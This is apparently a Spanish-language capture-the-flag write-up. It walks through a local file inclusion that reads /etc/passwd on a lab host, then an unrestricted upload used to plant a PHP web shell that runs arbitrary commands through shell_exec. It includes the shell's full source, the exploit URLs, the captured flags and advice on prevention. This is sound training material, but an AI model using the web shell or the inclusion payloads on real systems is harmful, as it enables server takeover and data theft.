

# Local File Inclusion
**URL** -> http://34.56.123.10:9411/private.php?page=account.php

A primera vista se ve normal.
![[Pasted image 20241105114503.png]]

La vulnerabilidad es de Local file inclusion debido a que es posible navegar por los directorios de la maquina por medio de la URL

en este caso es por `page=account.php`

como resultado encontramos el archivo de usuarios de la maquina.
`http://34.56.123.10:9411/private.php?page=/etc/passwd`

![[Pasted image 20241105114746.png]]
 -> flag: Flag{pelican-can-include-unsafely}:/home/mystery:/bin/bash


## Forma de prevenirlo

### **Validación y Saneamiento de Entradas**

- **Validar los Parámetros de Entrada**: Asegúrate de que cualquier entrada del usuario que se utilice para incluir archivos sea estrictamente validada. Por ejemplo, si permites que el usuario elija entre ciertos archivos, utiliza una lista blanca de opciones permitidas.
    
- **Saneamiento**: Elimina o codifica caracteres peligrosos (como `..`, `/`, `\`) que puedan ser utilizados para navegar por el sistema de archivos.
### **Uso de Rutas Absolutas o Relativas Controladas**
- **Rutas Absolutas**: Si es necesario incluir archivos, utiliza rutas absolutas que estén restringidas a un directorio específico en el servidor.
    
- **Rutas Relativas Controladas**: En lugar de permitir rutas arbitrarias, define un directorio base y asegúrate de que cualquier inclusión esté dentro de ese directorio.
#  Unrestricted File Upload

**URL** -> http://34.56.123.10:9421/private.php?page=account.php

Se observa una opción para subir una foto, pero si nos damos cuenta la pagina deja subir todo tipo de archivos como foto.

![[Pasted image 20241105120556.png]]

Entonces subiremos un script de php para buscarlo a posterior usando la vulnerabilidad de **local file inclusion**.

![[Pasted image 20241105120836.png]]

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $command = $_POST['command'];
    // Ejecuta el comando y captura la salida
    $output = shell_exec($command);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejecutor de Comandos</title>
</head>
<body>
    <h1>Ejecutor de Comandos</h1>
    <form method="POST">
        <label for="command">Introduce el comando:</label><br>
        <input type="text" id="command" name="command" required><br><br>
        <input type="submit" value="Ejecutar">
    </form>
    
    <?php
    if (isset($output)) {
        echo "<h2>Salida:</h2>";
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>
```


Con este script una vez subido hacemos el **LFI**, cual quedaria asi.
**URL** -> http://34.56.123.10:9421/private.php?page=/var/www/html/uploads/xdxd.php

Si nos fijamos bien el **LFI** que se puede hacer es **/var/www/html/** donde en el folder **/uploads/** es encontrado para almacenar imagenes por lo que el archivo **xdxd.php** es alojado ahi.

Una vez ahi podemos ejecutar comandos como servicio **(www-data)**

![[Pasted image 20241105121245.png]]

**Navegamos hacia la flag**

```bash
cd .. && cd .. && cd .. && cd /home/thor && ls && cat flag.txt
```

-> Flag{d8f23bd7581669c7a116d515da5ba91558cad46f}


## Foorma de prevenirlo
### **Validación de Archivos**

- **Tipo de Archivo**: Asegúrate de que solo se permitan tipos de archivos específicos. Por ejemplo, si solo se permiten imágenes, verifica que el archivo subido tenga una extensión de imagen válida (`.jpg`, `.png`, `.gif`, etc.).
